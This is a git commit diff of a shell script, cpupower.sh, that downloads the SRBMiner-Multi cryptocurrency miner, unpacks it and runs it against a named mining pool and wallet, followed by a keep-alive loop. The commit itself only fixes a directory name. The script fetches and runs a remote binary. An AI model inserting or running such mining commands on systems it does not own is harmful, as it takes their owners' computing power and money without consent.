8de0a2aa5a99080409a31e03174783f9836983a3
Ggmila <93731466+Ggmila@users.noreply.github.com>
2025-01-16 16:55:22 +0700

    Update cpupower.sh

--- cpupower.sh
+++ cpupower.sh
@@ -3,7 +3,7 @@ apt update
 apt install screen -y
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz
 tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz
-cd SRBMiner-Multi-2-7-5-
+cd SRBMiner-Multi-2-7-5
 ./SRBMiner-MULTI --algorithm cpupower --pool cugeoyom.tech:3035 --wallet CUrqEK6tynwy4fhzAGGE1HkfMenPoU4D8B
 while [ 1 ]; do
 sleep 3
